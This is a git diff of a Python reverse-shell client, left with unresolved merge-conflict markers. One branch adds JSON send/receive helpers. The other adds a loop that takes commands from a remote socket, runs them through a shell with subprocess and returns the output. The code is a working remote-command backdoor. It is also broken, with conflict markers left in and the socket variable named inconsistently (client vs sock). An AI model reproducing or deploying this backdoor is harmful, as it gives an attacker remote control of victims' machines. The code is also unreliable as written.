@@ -1,13 +1,17 @@
 #!/usr/bin/python
 import socket
 import subprocess
+<<<<<<< HEAD
 import json
+=======
+>>>>>>> 4534365bb9a54fa25ab972a622eb399b28c269a9
 
 def reliable_send(data):
     """Send JSON-encoded data to the server."""
     json_data = json.dumps(data)
     client.send(json_data.encode())
 
+<<<<<<< HEAD
 def reliable_recv():
     """Receive and decode JSON data from the server."""
     data = ""
@@ -45,3 +49,15 @@ except Exception as e:
     print(f"Error: {e}")
 finally:
     client.close()
+=======
+while True:
+	command = sock.recv(1024) #bytes
+	if command == "q": # if server stops communicating, break the loop
+		print('Server closed the connection')
+		break
+	else:
+		proc = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
+		result = proc.stdout.read() + proc.stderr.read()
+		sock.send(result)		
+sock.close()
+>>>>>>> 4534365bb9a54fa25ab972a622eb399b28c269a9
